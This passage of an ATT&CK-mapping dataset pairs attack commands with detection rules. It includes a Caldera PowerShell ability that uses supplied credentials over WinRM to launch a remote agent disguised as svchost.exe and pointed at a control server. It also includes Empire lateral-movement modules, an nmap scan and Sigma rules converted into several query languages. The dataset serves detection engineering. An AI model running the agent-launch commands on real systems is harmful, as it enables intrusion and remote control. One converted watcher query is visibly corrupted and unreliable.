\"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} -executors psh}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "payload": "sandcat.go-windows"}}}, "python/lateral_movement/multi/ssh_command", "python/lateral_movement/multi/ssh_command", "python/lateral_movement/multi/ssh_launcher", "python/lateral_movement/multi/ssh_launcher"], "technique_id": "T1021", "parsed_datasets": [{"Mitre Stockpile - Start Agent using WinRM (WinRM)": {"platforms": {"windows": {"psh": {"cleanup": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} -executors psh}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "payload": "sandcat.go-windows"}}}, "description": "Start Agent using WinRM (WinRM)", "tactic": "lateral-movement", "technique": {"attack_id": "T1021", "name": "Remote Services"}, "id": "41bb2b7a-75af-49fd-bd15-6c827df25921", "name": "Start Agent (WinRM)"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1021", "Empire Module": "python/lateral_movement/multi/ssh_command", "Technique": "Remote Services", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/lateral_movement/multi/ssh_command\":  [\"T1021\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1021", "Empire Module": "python/lateral_movement/multi/ssh_launcher", "Technique": "Remote Services", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/lateral_movement/multi/ssh_launcher\":  [\"T1021\"],"}}], "queries": [{"query": "title: Netsh RDP Port Forwarding\nid: 782d6f3e-4c5d-4b8c-92a3-1d05fed72e63\ndescription: Detects netsh commands that configure a port forwarding of port 3389 used for RDP\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html\ndate: 2019/01/29\ntags:\n    - attack.lateral_movement\n    - attack.t1021\n    - car.2013-07-002\nstatus: experimental\nauthor: Florian Roth\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - netsh i* p*=3389 c*\n    condition: selection\nfalsepositives:\n    - Legitimate administration\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Netsh RDP Port Forwarding\nid: 782d6f3e-4c5d-4b8c-92a3-1d05fed72e63\ndescription: Detects netsh commands that configure a port forwarding of port 3389 used for RDP\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html\ndate: 2019/01/29\ntags:\n    - attack.lateral_movement\n    - attack.t1021\n    - car.2013-07-002\nstatus: experimental\nauthor: Florian Roth\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - netsh i* p*=3389 c*\n    condition: selection\nfalsepositives:\n    - Legitimate administration\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(netsh\\\\ i*\\\\ p*\\\\=3389\\\\ c*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Netsh-RDP-Port-Forwarding <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Netsh RDP Port Forwarding\",\\n    \"description\": \"Detects netsh commands that configure a port forwarding of port 3389 used for RDP\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1021\",\\n      \"car.2013-07-002\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(netsh\\\\\\\\ i*\\\\\\\\ p*\\\\\\\\=3389\\\\\\\\ c*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(netsh\\\\\\\\ i*\\\\\\\\ p*\\\\\\\\=3389\\\\\\\\ c*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Netsh RDP Port Forwarding\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(netsh i* p*=3389 c*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"netsh i* p*=3389 c*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"netsh i* p*=3389 c*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*netsh i.* p.*=3389 c.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: T1003 Protected Storage Service Access\nid: 45545954-4016-43c6-855e-eae8f1c369dc\ndescription: Detects access to a protected_storage service over the network. Potential abuse of DPAPI to extract domain backup keys from Domain Controllers\nstatus: experimental\ndate: 2019/08/10\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/06_credential_access/T1003_credential_dumping/domain_dpapi_backupkey_extraction.md\ntags:\n    - attack.lateral_movement\n    - attack.t1021\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 5145\n        ShareName|contains: 'IPC'\n        RelativeTargetName: \"protected_storage\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: T1003 Protected Storage Service Access\nid: 45545954-4016-43c6-855e-eae8f1c369dc\ndescription: Detects access to a protected_storage service over the network. Potential abuse of DPAPI to extract domain backup keys from Domain Controllers\nstatus: experimental\ndate: 2019/08/10\nmodified: 2019/11/10\nauthor: Roberto Rodriguez @Cyb3rWard0g\nreferences:\n    - https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/playbooks/windows/06_credential_access/T1003_credential_dumping/domain_dpapi_backupkey_extraction.md\ntags:\n    - attack.lateral_movement\n    - attack.t1021\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection: \n        EventID: 5145\n        ShareName|contains: 'IPC'\n        RelativeTargetName: \"protected_storage\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"5145\" AND ShareName.keyword:*IPC* AND RelativeTargetName:\"protected_storage\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/T1003-Protected-Storage-Service-Access <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"T1003 Protected Storage Service Access\",\\n    \"description\": \"Detects access to a protected_storage service over the network. Potential abuse of DPAPI to extract domain backup keys from Domain Controllers\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1021\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"5145\\\\\" AND ShareName.keyword:*IPC* AND RelativeTargetName:\\\\\"protected_storage\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"5145\\\\\" AND ShareName.keyword:*IPC* AND RelativeTargetName:\\\\\"protected_storage\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'T1003 Protected Storage Service Access\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"5145\" AND ShareName.keyword:*IPC* AND RelativeTargetName:\"protected_storage\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"5145\" ShareName=\"*IPC*\" RelativeTargetName=\"protected_storage\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"5145\" ShareName=\"*IPC*\" RelativeTargetName=\"protected_storage\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*5145)(?=.*.*IPC.*)(?=.*protected_storage))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "data/abilities/technical-information-gathering/6014f7f7-ca45-4d55-9c05-d834d3233a21.yml", "command": {"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.nmap": [{"source": "remote.host.ip", "edge": "open_port", "target": "remote.host.port"}]}, "command": "nmap -Pn #{remote.host.ip}\n"}}}, "name": "Looks for open ports through scanning"}], "command_list": [{"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.nmap": [{"source": "remote.host.ip", "edge": "open_port", "target": "remote.host.port"}]}, "command": "nmap -Pn #{remote.host.ip}\n"}}}], "technique_id": "T1254", "parsed_datasets": [{"Mitre Stockpile - Looks for open ports through scanning": {"platforms": {"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.nmap": [{"source": "remote.host.ip", "edge": "open_port", "target": "remote.host.port"}]}, "command": "nmap -Pn #{remote.host.ip}\n"}}}, "description": "Looks for open ports through scanning", "tactic": "technical-information-gathering", "technique": {"attack_id": "T1254", "name": "Conduct Active Scanning"}, "id": "6014f7f7-ca45-4d55-9c05-d834d3233a21", "name": "Run NMAP"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "Threat Hunting Tables", "command": "control.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "malware.dll", "name": "loaded_dll"}, {"source": "Threat Hunting Tables", "command": "rundll32.exe", "name": "sub_process_1"}], "command_list": ["control.exe", "malware.dll", "rundll32.exe"], "technique_id": "T1129", "parsed_datasets": [{"Threat Hunting Tables": {"mitre_attack": "T1129", "file_value": "", "file_path": "", "parent_process": "control.exe", "itw_sample": "", "chain_id": "100015", "registry_value": "", "mitre_caption": "module_load", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "malware.dll", "os": "windows", "sub_process_1": "rundll32.exe", "sub_process_2": ""}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "Threat Hunting Tables", "command": "!=powershell.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "nslookup", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "!=cmd.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "nslookup", "name": "sub_process_1"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_sshcommand", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_sshcommand", "name": "Empire Module Command"}], "command_list": ["!=powershell.exe", "nslookup", "!=cmd.exe", "nslookup", "powershell/lateral_movement/invoke_sshcommand", "powershell/lateral_movement/invoke_sshcommand"], "technique_id": "T1043", "parsed_datasets": [{"Threat Hunting Tables": {"mitre_attack": "T1043", "file_value": "", "file_path": "", "parent_process": "!=powershell.exe", "itw_sample": "", "chain_id": "100051", "registry_value": "", "mitre_caption": "commonly_used_port", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "nslookup", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1043", "file_value": "", "file_path": "", "parent_process": "!=cmd.exe", "itw_sample": "", "chain_id": "100052", "registry_value": "", "mitre_caption": "commonly_used_port", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "nslookup", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1043", "Empire Module": "powershell/lateral_movement/invoke_sshcommand", "Technique": "Commonly Used Port", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_sshcommand\":  [\"T1043\"],"}}], "queries": [{"query": "title: Suspicious Typical Malware Back Connect Ports\nid: 4b89abaa-99fe-4232-afdd-8f9aa4d20382\nstatus: experimental\ndescription: Detects programs that connect to typical malware back connect ports based on statistical analysis from two different sandbox system databases\nreferences:\n    - https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo\nauthor: Florian Roth\ndate: 2017/03/19\ntags:\n    - attack.command_and_control\n    - attack.t1043\nlogsource:\n    product: windows\n    service: sysmon\n    definition: 'Use the following config to generate the necessary Event ID 10 Process Access events: <ProcessAccess onmatch=\"include\"><CallTrace condition=\"contains\">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess onmatch=\"exclude\"><CallTrace condition=\"excludes\">UNKNOWN</CallTrace></ProcessAccess>'\ndetection:\n    selection:\n        EventID: 3\n        Initiated: 'true'\n        DestinationPort:\n            - '4443'\n            - '2448'\n            - '8143'\n            - '1777'\n            - '1443'\n            - '243'\n            - '65535'\n            - '13506'\n            - '3360'\n            - '200'\n            - '198'\n            - '49180'\n            - '13507'\n            - '6625'\n            - '4444'\n            - '4438'\n            - '1904'\n            - '13505'\n            - '13504'\n            - '12102'\n            - '9631'\n            - '5445'\n            - '2443'\n            - '777'\n            - '13394'\n            - '13145'\n            - '12103'\n            - '5552'\n            - '3939'\n            - '3675'\n            - '666'\n            - '473'\n            - '5649'\n            - '4455'\n            - '4433'\n            - '1817'\n            - '100'\n            - '65520'\n            - '1960'\n            - '1515'\n            - '743'\n            - '700'\n            - '14154'\n            - '14103'\n            - '14102'\n            - '12322'\n            - '10101'\n            - '7210'\n            - '4040'\n            - '9943'\n    filter1:\n        Image: '*\\Program Files*'\n    filter2:\n        DestinationIp: \n            - '10.*'\n            - '192.168.*'\n            - '172.16.*'\n            - '172.17.*'\n            - '172.18.*'\n            - '172.19.*'\n            - '172.20.*'\n            - '172.21.*'\n            - '172.22.*'\n            - '172.23.*'\n            - '172.24.*'\n            - '172.25.*'\n            - '172.26.*'\n            - '172.27.*'\n            - '172.28.*'\n            - '172.29.*'\n            - '172.30.*'\n            - '172.31.*'\n            - '127.*'\n        DestinationIsIpv6: 'false'\n    condition: selection and not ( filter1 or filter2 )\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Typical Malware Back Connect Ports\nid: 4b89abaa-99fe-4232-afdd-8f9aa4d20382\nstatus: experimental\ndescription: Detects programs that connect to typical malware back connect ports based on statistical analysis from two different sandbox system databases\nreferences:\n    - https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo\nauthor: Florian Roth\ndate: 2017/03/19\ntags:\n    - attack.command_and_control\n    - attack.t1043\nlogsource:\n    product: windows\n    service: sysmon\n    definition: 'Use the following config to generate the necessary Event ID 10 Process Access events: <ProcessAccess onmatch=\"include\"><CallTrace condition=\"contains\">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess onmatch=\"exclude\"><CallTrace condition=\"excludes\">UNKNOWN</CallTrace></ProcessAccess>'\ndetection:\n    selection:\n        EventID: 3\n        Initiated: 'true'\n        DestinationPort:\n            - '4443'\n            - '2448'\n            - '8143'\n            - '1777'\n            - '1443'\n            - '243'\n            - '65535'\n            - '13506'\n            - '3360'\n            - '200'\n            - '198'\n            - '49180'\n            - '13507'\n            - '6625'\n            - '4444'\n            - '4438'\n            - '1904'\n            - '13505'\n            - '13504'\n            - '12102'\n            - '9631'\n            - '5445'\n            - '2443'\n            - '777'\n            - '13394'\n            - '13145'\n            - '12103'\n            - '5552'\n            - '3939'\n            - '3675'\n            - '666'\n            - '473'\n            - '5649'\n            - '4455'\n            - '4433'\n            - '1817'\n            - '100'\n            - '65520'\n            - '1960'\n            - '1515'\n            - '743'\n            - '700'\n            - '14154'\n            - '14103'\n            - '14102'\n            - '12322'\n            - '10101'\n            - '7210'\n            - '4040'\n            - '9943'\n    filter1:\n        Image: '*\\Program Files*'\n    filter2:\n        DestinationIp: \n            - '10.*'\n            - '192.168.*'\n            - '172.16.*'\n            - '172.17.*'\n            - '172.18.*'\n            - '172.19.*'\n            - '172.20.*'\n            - '172.21.*'\n            - '172.22.*'\n            - '172.23.*'\n            - '172.24.*'\n            - '172.25.*'\n            - '172.26.*'\n            - '172.27.*'\n            - '172.28.*'\n            - '172.29.*'\n            - '172.30.*'\n            - '172.31.*'\n            - '127.*'\n        DestinationIsIpv6: 'false'\n    condition: selection and not ( filter1 or filter2 )\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"3\" AND Initiated:\"true\" AND DestinationPort:(\"4443\" OR \"2448\" OR \"8143\" OR \"1777\" OR \"1443\" OR \"243\" OR \"65535\" OR \"13506\" OR \"3360\" OR \"200\" OR \"198\" OR \"49180\" OR \"13507\" OR \"6625\" OR \"4444\" OR \"4438\" OR \"1904\" OR \"13505\" OR \"13504\" OR \"12102\" OR \"9631\" OR \"5445\" OR \"2443\" OR \"777\" OR \"13394\" OR \"13145\" OR \"12103\" OR \"5552\" OR \"3939\" OR \"3675\" OR \"666\" OR \"473\" OR \"5649\" OR \"4455\" OR \"4433\" OR \"1817\" OR \"100\" OR \"65520\" OR \"1960\" OR \"1515\" OR \"743\" OR \"700\" OR \"14154\" OR \"14103\" OR \"14102\" OR \"12322\" OR \"10101\" OR \"7210\" OR \"4040\" OR \"9943\")) AND (NOT ((Image.keyword:*\\\\\\\\Program\\\\ Files* OR (DestinationIp.keyword:(10.* OR 192.168.* OR 172.16.* OR 172.17.* OR 172.18.* OR 172.19.* OR 172.20.* OR 172.21.* OR 172.22.* OR 172.23.* OR 172.24.* OR 172.25.* OR 172.26.* OR 172.27.* OR 172.28.* OR 172.29.* OR 172.30.* OR 172.31.* OR 127.*) AND DestinationIsIpv6:\"false\")))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Typical-Malware-Back-Connect-Ports <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Typical Malware Back Connect Ports\",\\n    \"description\": \"Detects programs that connect to typical malware back connect ports based on statistical analysis from two different sandbox system databases\",\\n    \"tags\": [\\n      \"attack.command_and_control\",\\n      \"attack.t1043\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"3\\\\\" AND Initiated:\\\\\"true\\\\\" AND DestinationPortmage.keyword:*\\\\\\\\\\\\\\\\Program\\\\\\\\ Files* OR (DestinationIp.keyword:(10.* OR 192.168.* OR 172.16.* OR 172.17.* OR 172.18.* OR 172.19.* OR 172.20.* OR 172.21.* OR 172.22.* OR 172.23.* OR 172.24.* OR 172.25.* OR 172.26.* OR 172.27.* OR 172.28.* OR 172.29.* OR 172.30.* OR 172.31.* OR 127.*) AND DestinationIsIpv6:\\\\\"false\\\\\")))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"3\\\\\" AND Initiated:\\\\\"true\\\\\" AND DestinationPort:(\\\\\"4443\\\\\" OR \\\\\"2448\\\\\" OR \\\\\"8143\\\\\" OR \\\\\"1777\\\\\" OR \\\\\"1443\\\\\" OR \\\\\"243\\\\\" OR \\\\\"65535\\\\\" OR \\\\\"13506\\\\\" OR \\\\\"3360\\\\\" OR \\\\\"200\\\\\" OR \\\\\"198\\\\\" OR \\\\\"49180\\\\\" OR \\\\\"13507\\\\\" OR \\\\\"6625\\\\\" OR \\\\\"4444\\\\\" OR \\\\\"4438\\\\\" OR \\\\\"1904\\\\\" OR \\\\\"13505\\\\\" OR \\\\\"13504\\\\\" OR \\\\\"12102\\\\\" OR \\\\\"9631\\\\\" OR \\\\\"5445\\\\\" OR \\\\\"2443\\\\\" OR \\\\\"777\\\\\" OR \\\\\"13394\\\\\" OR \\\\\"13145\\\\\" OR \\\\\"12103\\\\\" OR \\\\\"5552\\\\\" OR \\\\\"3939\\\\\" OR \\\\\"3675\\\\\" OR \\\\\"666\\\\\" OR \\\\\"473\\\\\" OR \\\\\"5649\\\\\" OR \\\\\"4455\\\\\" OR \\\\\"4433\\\\\" OR \\\\\"1817\\\\\" OR \\\\\"100\\\\\" OR \\\\\"65520\\\\\" OR \\\\\"1960\\\\\" OR \\\\\"1515\\\\\" OR \\\\\"743\\\\\" OR \\\\\"700\\\\\" OR \\\\\"14154\\\\\" OR \\\\\"14103\\\\\" OR \\\\\"14102\\\\\" OR \\\\\"12322\\\\\" OR \\\\\"10101\\\\\" OR \\\\\"7210\\\\\" OR \\\\\"4040\\\\\" OR \\\\\"9943\\\\\")) AND (NOT ((Image.keyword:*\\\\\\\\\\\\\\\\Program\\\\\\\\ Files* OR (DestinationIp.keyword:(10.* OR 192.168.* OR 172.16.* OR 172.17.* OR 172.18.* OR 172.19.* OR 172.20.* OR 172.21.* OR 172.22.* OR 172.23.* OR 172.24.* OR 172.25.* OR 172.26.* OR 172.27.* OR 172.28.* OR 172.29.* OR 172.30.* OR 172.31.* OR 127.*) AND DestinationIsIpv6:\\\\\"false\\\\\")))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Typical Malware Back Connect Ports\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"3\" AND Initiated:\"true\" AND DestinationPort:(\"4443\" \"2448\" \"8143\" \"1777\" \"1443\" \"243\" \"65535\" \"13506\" \"3360\" \"200\" \"198\" \"49180\" \"13507\" \"6625\" \"4444\" \"4438\" \"1904\" \"13505\" \"13504\" \"12102\" \"9631\" \"5445\" \"2443\" \"777\" \"13394\" \"13145\" \"12103\" \"5552\" \"3939\" \"3675\" \"666\" \"473\" \"5649\" \"4455\" \"4433\" \"1817\" \"100\" \"65520\" \"1960\" \"1515\" \"743\" \"700\" \"14154\" \"14103\" \"14102\" \"12322\" \"10101\" \"7210\" \"4040\" \"9943\")) AND (NOT ((Image.keyword:*\\\\\\\\Program Files* OR (DestinationIp.keyword:(10.* 192.168.* 172.16.* 172.17.* 172.18.* 172.19.* 172.20.* 172.21.* 172.22.* 172.23.* 172.24.* 172.25.* 172.26.* 172.27.* 172.28.* 172.29.* 172.30.* 172.31.* 127.*) AND DestinationIsIpv6:\"false\")))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"3\" Initiated=\"true\" (DestinationPort=\"4443\" OR DestinationPort=\"2448\" OR DestinationPort=\"8143\" OR DestinationPort=\"1777\" OR DestinationPort=\"1443\" OR DestinationPort=\"243\" OR DestinationPort=\"65535\" OR DestinationPort=\"13506\" OR DestinationPort=\"3360\" OR DestinationPort=\"200\" OR DestinationPort=\"198\" OR DestinationPort=\"49180\" OR DestinationPort=\"13507\" OR DestinationPort=\"6625\" OR DestinationPort=\"4444\" OR DestinationPort=\"4438\" OR DestinationPort=\"1904\" OR DestinationPort=\"13505\" OR DestinationPort=\"13504\" OR DestinationPort=\"12102\" OR DestinationPort=\"9631\" OR DestinationPort=\"5445\" OR DestinationPort=\"2443\" OR DestinationPort=\"777\" OR DestinationPort=\"13394\" OR DestinationPort=\"13145\" OR DestinationPort=\"12103\" OR DestinationPort=\"5552\" OR DestinationPort=\"3939\" OR DestinationPort=\"3675\" OR DestinationPort=\"666\" OR DestinationPort=\"473\" OR DestinationPort=\"5649\" OR DestinationPort=\"4455\" OR DestinationPort=\"4433\" OR DestinationPort=\"1817\" OR DestinationPort=\"100\" OR DestinationPort=\"65520\" OR DestinationPort=\"1960\" OR DestinationPort=\"1515\" OR DestinationPort=\"743\" OR DestinationPort=\"700\" OR DestinationPort=\"14154\" OR DestinationPort=\"14103\" OR DestinationPort=\"14102\" OR DestinationPort=\"12322\" OR DestinationPort=\"10101\" OR DestinationPort=\"7210\" OR DestinationPort=\"4040\" OR DestinationPort=\"9943\")) NOT ((Image=\"*\\\\\\\\Program Files*\" OR ((DestinationIp=\"10.*\" OR DestinationIp=\"192.168.*\" OR DestinationIp=\"172.16.*\" OR DestinationIp=\"172.17.*\" OR DestinationIp=\"172.18.*\" OR DestinationIp=\"172.19.*\" OR DestinationIp=\"172.20.*\" OR DestinationIp=\"172.21.*\" OR DestinationIp=\"172.22.*\" OR DestinationIp=\"172.23.*\" OR DestinationIp=\"172.24.*\" OR DestinationIp=\"172.25.*\" OR DestinationIp=\"172.26.*\" OR DestinationIp=\"172.27.*\" OR DestinationIp=\"172.28.*\" OR DestinationIp=\"172.29.*\" OR DestinationIp=\"172.30.*\" OR DestinationIp=\"172.31.*\" OR DestinationIp=\"127.*\") DestinationIsIpv6=\"false\"))))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"3\" Initiated=\"true\" DestinationPort IN 